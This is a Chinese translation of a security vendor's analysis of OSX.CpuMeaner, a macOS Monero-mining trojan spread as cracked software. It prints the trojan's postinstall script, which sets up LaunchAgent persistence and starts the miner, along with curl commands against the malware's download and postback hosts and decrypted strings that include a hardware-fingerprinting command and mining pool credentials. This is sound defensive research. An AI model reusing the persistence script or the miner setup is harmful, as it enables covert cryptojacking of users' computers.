# OSX.CpuMeaner：针对macOS平台的新型挖矿木马

阅读量 **211535**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2017-11-30 14:08:49

 **x**

##### 译文声明

本文是翻译文章，文章原作者 Arnaud Abbati，文章来源：sentinelone.com

原文地址：<https://www.sentinelone.com/blog/osx-cpumeaner-miner-trojan-software-pirates/>

译文仅供参考，具体内容表达以及含义原文为准。

译者：[興趣使然的小胃](http://bobao.360.cn/member/contribute?uid=2819002922)

预估稿费：200RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

##

## 一、前言

在本文中，我们分析了针对macOS平台的一款新型密币（cryptocurrency）挖矿木马。这个恶意软件伪装成盗版应用程序，使用用户硬件来悄悄挖掘门罗币（Monero）。

虽然这款恶意软件设计思路与[OSX.Pwnet](https://www.sentinelone.com/blog/osx-pwnet-a-csgo-hack-and-sneaky-miner/)类似，但具体实现更贴近于广告软件这一类别。

##

## 二、感染途径

使用盗版软件的个人用户很容易栽在恶意软件身上，这些恶意软件的来源千奇百怪，可以来自于[Google搜索](https://lmgtfy.com/?q=sketch+mac+crack)，也可以来自于包含[恶意链接](http://crackedmine.com/sketch-crack-mac-free-2017-here/)的YouTube[视频](https://www.youtube.com/watch?v=F8IlSEie6iM)描述。在面对欺诈型[技术支持攻击](https://en.wikipedia.org/wiki/Technical_support_scam)、伪造的Flash播放器以及热情推荐的病毒扫描服务时，受害者最终可能会安装恶意软件包。例如，某个用户正在寻找破解版的Sketch应用，相关网络行为如下所示：

![](https://p3.ssl.qhimg.com/t01ec19822916fc6fa9.jpg)

    
    
    $ curl -svJO http://jumpcash.xyz/download.php -G -d e=pkg -d tag=mosx3 -d clickid=2305343 -d key="Sketch 47 Crack"
    *   Trying 46.30.45.236...
    * Connected to jumpcash.xyz (46.30.45.236) port 80 (#0)
    > GET /download.php?e=pkg&tag=mosx3&clickid=2305343&key=Sketch 47 Crack HTTP/1.1
    > Host: jumpcash.xyz
    > User-Agent: curl/7.43.0
    > Accept: */*
    > 
    < HTTP/1.1 200 OK
    < Server: nginx/1.4.6 (Ubuntu)
    < Date: Tue, 14 Nov 2017 10:19:17 GMT
    < Content-Type: application/octet-stream
    < Content-Length: 169267
    < Connection: keep-alive
    < X-Powered-By: PHP/5.5.9-1ubuntu4.21
    < Content-Description: File Transfer
    < Content-Disposition: attachment; filename=Sketch_47_Crack-2305343-823868397374412531.pkg
    < Content-Transfer-Encoding: binary
    < Expires: 0
    < Cache-Control: must-revalidate
    < Pragma: public
    < 
    { [936 bytes data]
    * Connection #0 to host jumpcash.xyz left intact
    
    $ shasum -a 256 Sketch_47_Crack-2305343-823868397374412531.pkg 
    7a6cc593a8fb2853b817013e28681fa1698fd59d0cea69ba06b7a4b6dc3d5c80  Sketch_47_Crack-2305343-823868397374412531.pkg
    

目标文件名由网页请求中的`key`及`clickid`参数生成而得。当然，用户下载的软件包实际上并不是盗版软件。

![](https://p5.ssl.qhimg.com/t01db6a2ad9ddaedf08.jpg)

我们也能在一个伪造的法国种子（torrent）[站点](https://frtorrentz.fr/)上找到这种恶意软件：

![](https://p4.ssl.qhimg.com/t01a3b41386f7470da0.jpg)

有一些用户曾在Apple论坛上抱怨过系统被安装上[xmemapp](https://discussions.apple.com/thread/8124632)以及[cpucooler](https://discussions.apple.com/thread/8148594)程序。根据[VirusTotal](https://www.virustotal.com/file/d15a51bb1a88a8906a997a0d4c0d3fb35ddd64b722af23120600eeea989ecef9/analysis/1509379736/)的统计结果，该恶意软件自2017年9月下旬以来已经处于活跃状态，并且不会被任何反病毒软件检测出来（
**检测率为0** ）。

##

## 三、软件包分析

在本文撰写过程中，托管服务器上总共包含3款软件包，其标签分别为mosx1.pkg、mosx2.pkg以及mosx3.pkg：

    
    
    $ for tag in mosx{1,2,3} ; do curl -s -o $tag.pkg http://jumpcash.xyz/download.php -G -d e=pkg -d tag=$tag ; done
    
    $ shasum -a 256 mosx*.pkg
    d15a51bb1a88a8906a997a0d4c0d3fb35ddd64b722af23120600eeea989ecef9  mosx1.pkg
    c3c0da504e40359ce8247b912cbff00cbd32a2222cb53a6bd30f2e44f7781049  mosx2.pkg
    7a6cc593a8fb2853b817013e28681fa1698fd59d0cea69ba06b7a4b6dc3d5c80  mosx3.pkg
    

这些软件包都经过同一个开发者身份证书签名。

    
    
    $ ls mosx*.pkg | xargs -L 1 pkgutil --check-signature | awk '/Developer ID Installer/'
        1. Developer ID Installer: Artur Nurgaliev (DEWCRD3789)
        1. Developer ID Installer: Artur Nurgaliev (DEWCRD3789)
        1. Developer ID Installer: Artur Nurgaliev (DEWCRD3789)
    

Apple已于2017年11月10撤销了该证书：

    
    
    $ ls mosx*.pkg | xargs -L 1 spctl --assess -v --type install
    mosx1.pkg: CSSMERR_TP_CERT_REVOKED
    mosx2.pkg: CSSMERR_TP_CERT_REVOKED
    mosx3.pkg: CSSMERR_TP_CERT_REVOKED
    

标记为 _mosx1_ 的软件包会释放`xmemapp`载荷程序，而标记为 _mosx2_ 或者 _mosx3_
的软件包会释放`cpucooler`载荷程序:

    
    
    $ for pkg in mosx*.pkg ; do echo $pkg: $(pkgutil --payload-files $pkg | egrep -v -e ^.$) ; done
    mosx1.pkg: ./xmemapp
    mosx2.pkg: ./cpucooler
    mosx3.pkg: ./cpucooler
    

这些载荷文件的哈希值并不相同：

    
    
    $ for tag in mosx{1,2,3} ; do pkgutil --expand $tag.pkg $tag && tar xf $tag/Payload -C $tag ; done
    
    $ shasum -a 256 mosx*/{x,c}*
    d196aba4d59b132fc9cd6f6ba627166a8eb6631017636b0ed4df7fd0260524a5  mosx1/xmemapp
    47e523a8b796c27b6c0fe91a4781aa7b47c8d66ddb75117d3f3283a6079ff128  mosx2/cpucooler
    5c41ab1d3aaa33e021eb73c1a58894df8e679366d2f03663b8f1029a0dc80f26  mosx3/cpucooler
    

程序也没有经过代码签名（code-signed）：

    
    
    $ ls mosx*/{x,c}* | xargs -L 1 codesign -dvvv
    mosx1/xmemapp: code object is not signed at all
    mosx2/cpucooler: code object is not signed at all
    mosx3/cpucooler: code object is not signed at all
    

这些程序的安装路径也各不相同：

    
    
    $ for tag in mosx{1,2,3}; do echo $tag: $(xmllint --xpath "string(//pkg-info/@install-location)" $tag/PackageInfo) ; done
    mosx1: /Library/Application Support/XMemApp
    mosx2: /Library/Application Support/CpuCooler
    mosx3: /Library/Application Support/CpuCooler
    

安装完毕后，软件包会运行`postinstall`脚本，该脚本的功能包括：

1、将 _launchd.plist_ 文件写入`/Library/LaunchAgents`目录中，以实现本地持久化目的。

2、加载启动代理（Launch Agent）。

3、等待10秒，然后终止与当前可执行文件名匹配的所有进程。

4、在后台等待60秒，以软件包名为参数运行可执行文件。

mosx2以及mosx3软件包所使用的`postinstall`脚本如下所示：

    
    
    #!/bin/bash
    IDENTIFIER="com.osxext.cpucooler"
    INSTALL_LOCATION="/Library/Application Support/CpuCooler/cpucooler"
    
    LAUNCH_AGENT_PLIST="/Library/LaunchAgents/$IDENTIFIER.plist"
    
    echo '<?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
    <plist version="1.0">
    <dict>
        <key>Label</key>
        <string>'$IDENTIFIER'</string>
        <key>Program</key>
        <string>'$INSTALL_LOCATION'</string>
        <key>RunAtLoad</key>
        <true/>
    </dict>
    </plist>' > "$LAUNCH_AGENT_PLIST"
    
    FILENAME=$(basename "$1")
    /bin/launchctl load "$LAUNCH_AGENT_PLIST"
    sleep 10 && sudo pkill cpucooler
    sleep 60 && /Library/Application Support/CpuCooler/cpucooler "$FILENAME" &
    exit

##

## 四、可执行文件分析

`xmemapp`以及`cpucooler`实际上是定制化的[2.3.1版](https://github.com/xmrig/xmrig/tree/v2.3.1)的[XMRig](https://github.com/xmrig/xmrig)
（XMRig是一款开源的门罗币CPU挖矿软件）。

作者在代码中添加了一些函数，以还原某些混淆字符串，并将结果反馈至服务器：

    
    
    Postback::sendPostback(std::string const&);
    Utils::Utils();
    Utils::encdec(std::string);
    Utils::exec(std::string const&);
    Utils::getNumber();
    Utils::hex_to_string(std::string const&);
    Utils::jenkins_one_at_a_time_hash(std::string, unsigned long);
    Utils::str_replace(std::string, std::string const&, std::string const&);
    Utils::~Utils();
    

main()函数中还会设置一些默认参数。这些参数被硬编码在程序中，包括如下几类：

1、挖矿服务器的URL地址，用`-o`参数来设定；

2、挖矿服务器的用户名，用`-u`参数来设定；

3、挖矿服务器的密码，用`-p x`参数来设定；

4、使用`--safe`参数来安全调整当前CPU的线程数以及av（algorithm variation，具体使用的算法）参数；

5、使用`-t 2`参数来设定挖矿程序所使用的线程数。

在`Utils::encdec()`函数中，程序使用`Utils::hex_to_string()`来解码十六进制形式的字符串，然后将解码结果与`0x4e`进行异或（XOR），得到解密后的结果。

    
    
    $ strings mosx3/cpucooler | egrep -e ^[[:xdigit:]]+$ -m 5
    27213c2b296e633c2a7f6e63397e6e632d6e0f3e3e222b0f060d070a273d250a3c27382b3c6e326e2f39256e69611d2b3c272f226e003b232c2b3c6135293d3b2c666c126c6c626e6c6c626e6a7a67753e3c27203a6e6a7a3369
    243b233e2d2f3d2660363734
    23213d367d
    3d3a3c2f3a3b23653a2d3e74616136233c603e212122602327202b3c292f3a2b602d2123747a7b7b787e
    232f3c3a27202439262b2b3a0e232f2722602d2123
    
    $ ../decrypt_strings.py mosx1/xmemapp mosx{2,3}/cpucooler
    Decrypted strings for: mosx1/xmemapp
    ioreg -rd1 -w0 -c AppleAHCIDiskDriver | awk '/Serial Number/{gsub(""", "", $4);print $4}'
    jumpcash.xyz
    mosx1
    stratum+tcp://xmr.pool.minergate.com:45560
    jeffguyen@mail.com
    Decrypted strings for: mosx2/cpucooler
    ioreg -rd1 -w0 -c AppleAHCIDiskDriver | awk '/Serial Number/{gsub(""", "", $4);print $4}'
    jumpcash.xyz
    mosx2
    stratum+tcp://xmr.pool.minergate.com:45560
    jeffguyen@mail.com
    Decrypted strings for: mosx3/cpucooler
    ioreg -rd1 -w0 -c AppleAHCIDiskDriver | awk '/Serial Number/{gsub(""", "", $4);print $4}'
    jumpcash.xyz
    mosx3
    stratum+tcp://xmr.pool.minergate.com:45560
    martinjwheet@mail.com
    

这些程序使用2个线程（即200%的CPU使用率）连接到[MinerGate的XMR矿池](https://minergate.com/pool-stats/xmr)，挖矿所使用的账号为`[jeffguyen@mail.com](mailto:jeffguyen@mail.com)`（mosx1以及mosx2）以及
`[martinjwheet@mail.com](mailto:martinjwheet@mail.com)`（mosx3）。

当使用真实的参数来运行时（如通过`postinstall`脚本来运行时），`main()`函数会在第一个参数（软件包名称）中查找`-`及`.`符号，找到这些符号后，就会将子字符串作为参数来调用`Postback::sendPostback()`函数。

`Postback::sendPostback()` 会将安装数据发送给经过解码的某个域名，请求网址中带有通过
`Utils::getNumber()`生成的参数。

    
    
    $ curl -A MNR -w "%{http_code}" http://jumpcash.xyz/pb.php -G -d t=mosx3 -d mid=2162179746 -d i=2305343-823868397374412531
    200
    

`Utils::getNumber()`函数会通过 `Utils::exec()`来运行解码后的
`ioreg`命令。得到命令输出结果后，使用Jenkins的[一次性哈希算法](https://en.wikipedia.org/wiki/Jenkins_hash_function#one-at-a-time)生成该结果的哈希值（十进制形式），该哈希值作为Web请求参数加以使用。

有趣的是，程序中并没有使用`Utils::str_replace()`函数以及`Utils::jenkins_one_at_a_time_hash()`函数（这些代码属于僵尸代码）。

##

## 五、MNR2变种分析

`jumpcash.xyz`域名取消服务后，又涌现出一大批新的变种，这些变种托管于其他网站，如[网站1](https://crackprowin.com/sketch-crack-mac/)及[网站2](http://softwarestrack.com/sketch-42-crack-keygen/)。

![](https://p0.ssl.qhimg.com/t01650263c682ebda23.jpg)

    
    
    $ for tag in mosx{2,3,np} ; do curl -s -o $tag.pkg http://storekit.xyz/api/v1/download.php -G -d e=pkg -d tag=$tag ; done
    
    $ shasum -a 256 *.pkg
    b6cbc89d0b5a8938c74c1f601a2b7a88b4a3391bf808d2c028885003a16d9b5a  mosx2.pkg
    f1da940d6f417ef0001595ed816889ecdcacb41a3d6c921b6e039dc30e35ab8a  mosx3.pkg
    6e0ec2d6754138b5971f417176136a7becfd75359919a8a5a3b4233aeaade9b3  mosxnp.pkg
    

这些软件包使用的是另一个开发者身份（该身份很快就被撤销掉）：

    
    
    $ ls mosx*.pkg | xargs -L 1 pkgutil --check-signature | awk '/Developer ID Installer/'
        1. Developer ID Installer: Adam Kortney (9ADZ437492)
        1. Developer ID Installer: Adam Kortney (9ADZ437492)
        1. Developer ID Installer: Adam Kortney (9ADZ437492)
    
    $ ls mosx*.pkg | xargs -L 1 spctl --assess -v --type install
    mosx2.pkg: accepted
    source=Developer ID
    mosx3.pkg: accepted
    source=Developer ID
    mosxnp.pkg: accepted
    source=Developer ID
    

同样，Apple于2017年11月22日吊销了该证书：

![](https://p3.ssl.qhimg.com/t01ffccdb6369627d49.jpg)

这些软件包安装的可执行文件使用了新的名称以及路径：

    
    
    $ for pkg in mosx*.pkg ; do echo $pkg: $(pkgutil --payload-files $pkg | egrep -v -e ^.$) ; done
    mosx2.pkg: ./mxcpu
    mosx3.pkg: ./mxzcpu
    mosxnp.pkg: ./moszcpu
    
    $ for tag in mosx{2,3,np} ; do pkgutil --expand $tag.pkg $tag && tar xf $tag/Payload -C $tag ; done
    
    $ shasum -a 256 mosx*/m*cpu
    91b929d2470e3507b5faf5f12adb35046d96777e8b55b28b8e859a30924168b2  mosx2/mxcpu
    b636b2cc15925e68c200449d5d78a9e169af379e4e3b007075ded00d777ffdc7  mosx3/mxzcpu
    9a8b16f0a44cd63bf525142519b23481d4dcfd84d2dae02a0b0b9cb5caf1c147  mosxnp/moszcpu
    
    $ for tag in mosx{2,3,np}; do echo $tag: $(xmllint --xpath "string(//pkg-info/@install-location)" $tag/PackageInfo) ; done
    mosx2: /Library/Application Support/mxcpu
    mosx3: /Library/Application Support/mxzcpu
    mosxnp: /Library/Application Support/moszcpu
    

新软件包使用了一个`preinstall`脚本，如果当前主机已经感染老的变种时，该脚本会生成一个错误代码，退出执行流程。

`postinstall`脚本也有所不同，新版的工作流程如下：

1、将 _launchd.plist_ 文件写入`/Library/LaunchAgents`目录中，以达成本地持久化目的。

2、如果当前主机已被木马感染，则退出执行。

3、将软件包名写入`/Library/Application Support/mosxnp/info`文件中。

4、加载并启动启动代理（Launch Agent）。

5、等待5秒钟，检查程序是否已经运行。

6、如果尚未运行，后台等待30秒，再次以软件包名为参数执行程序。

7、将安装状态发送给远程服务器。

新版程序基于[2.4.2](https://github.com/xmrig/xmrig/tree/v2.4.2)版的XMRig来开发。其中使用的自定义函数与之前版本类似。`main()`函数现在会从`/Library/Application
Support/mosxnp/info`文件中读取软件包名。

新版程序的目标操作系统为macOS Sierra或者更高版本（10.12+），在低版本系统上运行时会崩溃。

    
    
    $ uname -v
    Darwin Kernel Version 15.6.0: Mon Aug 29 20:21:34 PDT 2016; root:xnu-3248.60.11~1/RELEASE_X86_64
    
    $ ./mxzcpu 
    dyld: lazy symbol binding failed: Symbol not found: _clock_gettime
      Referenced from: /Library/Application Support/mxzcpu/./mxzcpu (which was built for Mac OS X 10.12)
      Expected in: /usr/lib/libSystem.B.dylib
    
    dyld: Symbol not found: _clock_gettime
      Referenced from: /Library/Application Support/mxzcpu/./mxzcpu (which was built for Mac OS X 10.12)
      Expected in: /usr/lib/libSystem.B.dylib
    
    Trace/BPT trap: 5
    

这么做也能理解，因为macOS
Sierra系统需要搭配启用[SSE4](https://en.wikipedia.org/wiki/SSE4)功能的处理器，采用这种指令集时，程序的挖矿速度会更快。

解密后的字符串如下所示：

    
    
    $ ../decrypt_strings.py mosx*/m*cpu
    Decrypted strings for: mosx2/mxcpu
    storekit.xyz
    mosx2
    ioreg -rd1 -w0 -c AppleAHCIDiskDriver | awk '/Serial Number/{gsub(""", "", $4);print $4}'
    /Library/Application Support/mxcpu/info
    stratum+tcp://xmr.pool.minergate.com:45560
    jeffguyen@mail.com
    Decrypted strings for: mosx3/mxzcpu
    storekit.xyz
    mosx3
    ioreg -rd1 -w0 -c AppleAHCIDiskDriver | awk '/Serial Number/{gsub(""", "", $4);print $4}'
    /Library/Application Support/mxzcpu/info
    stratum+tcp://xmr.pool.minergate.com:45560
    martinjwheet@mail.com
    Decrypted strings for: mosxnp/moszcpu
    storekit.xyz
    mosxnp
    ioreg -rd1 -w0 -c AppleAHCIDiskDriver | awk '/Serial Number/{gsub(""", "", $4);print $4}'
    /Library/Application Support/moszcpu/info
    stratum+tcp://xmr-eu1.nanopool.org:14444
    49dP6YfhFHmLWb16jESv8V977cYzbx8zCXz6A7gUh1sn65jQ1eQgUpG9qCs2mfNhVW9Jm86RQpDGTHxokFnutubU6HQCeuN.34c5cb2b877d296b3fcfd9c6fb9a5da0c42b044e7fd52372ae5b6cd9bbe6c5c8.
    

标记为 _mosxnp_ 的变种会连接到[Nanopool XMR矿池](https://xmr.nanopool.org/)来挖矿。

新变种通过`Postback::sendPostback()`函数将安装数据发送至`storekit.xyz`主机上的`/api/v1/pb.php`页面，使用的User-Agent为`MNR2`。

##

## 六、VirusTotal上的样本

2017年中旬，有人将标记为[
_mosx3_](https://www.virustotal.com/file/f9ccfaf965f9b06f3e06b1112e30cc2be97fca76db001f901b4ab0cc28cd44d4/analysis/1510909946/)以及[
_mosxnp_](https://www.virustotal.com/file/fa5ab22307e9539e955a49abf225263fadc7b3f129696c7bc665353bf4650e60/analysis/1510871215/)的软件包上传到VirusTotal上进行检测。

这些软件包中包含的可执行程序（`cpulite`及`mosxnp`）都是MNR2变种，但所使用的`postinstall`脚本略有不同。

程序并没有[静态链接](https://github.com/xmrig/xmrig/wiki/OS-X-Build)XMRig的依赖项（[libuv](http://libuv.org/)以及[libmicrohttpd](https://www.gnu.org/software/libmicrohttpd/)），只导入了所需的符号。由于目标主机上经常缺乏程序所需的动态链接库（[Homebrew](https://brew.sh/)路径），因此这些程序会在启动时崩溃：

    
    
    $ otool -L mosxnp
    mosxnp:
        /usr/local/opt/libuv/lib/libuv.1.dylib (compatibility version 2.0.0, current version 2.0.0)
        /usr/local/opt/libmicrohttpd/lib/libmicrohttpd.12.dylib (compatibility version 56.0.0, current version 56.0.0)
        /usr/lib/libc++.1.dylib (compatibility version 1.0.0, current version 307.4.0)
        /usr/lib/libSystem.B.dylib (compatibility version 1.0.0, current version 1238.0.0)
    
    $ ./mosxnp
    dyld: Library not loaded: /usr/local/opt/libuv/lib/libuv.1.dylib
      Referenced from: /Library/Application Support/mosxnp/./mosxnp
      Reason: image not found
    Abort trap: 6

##

## 七、总结

这款OSX.CpuMeaner木马是新型挖矿攻击大军中的一员，现在新型挖矿攻击的规模日益膨胀，我们可以在Android、PC、Linux服务器上看到挖矿攻击活动的身影，甚至Chrome浏览器上也存在CoinHive这种挖矿脚本。事实上，攻击者一直在寻找通过恶意软件感染来谋取利益的方式，虽然挖矿恶意软件并不属于传统的攻击方式（如窃取密码及其他敏感信息、远程控制设备等），但这种攻击方式回报丰厚，只需使用CPU以及少量网络通信就能满足攻击要求。

我们无法百分百肯定这类攻击活动会一直处于活跃状态，但只要整个市场持续膨胀，人们发现投资类似门罗币（Monero）、达世币（DASH）之类的加密货币能获得极高的回报率（ROI），那么这类攻击事件也会持续涌现，源远流长。

本文翻译自sentinelone.com [原文链接](https://www.sentinelone.com/blog/osx-cpumeaner-miner-trojan-software-pirates/)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **興趣使然的小胃** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/87715](/post/id/87715)

安全客 - 有思想的安全新媒体

本文转载自: [sentinelone.com](https://www.sentinelone.com/blog/osx-cpumeaner-miner-trojan-software-pirates/)

如若转载,请注明出处： <https://www.sentinelone.com/blog/osx-cpumeaner-miner-trojan-software-pirates/>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [macOS](/tag/macOS)
  * [挖矿木马](/tag/挖矿木马)

 **+1** __0赞

 __收藏

![](https://p2.ssl.qhmsg.com/dm/200_200_100/t0104d1b8b4ca36e961.jpg) 興趣使然的小胃

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

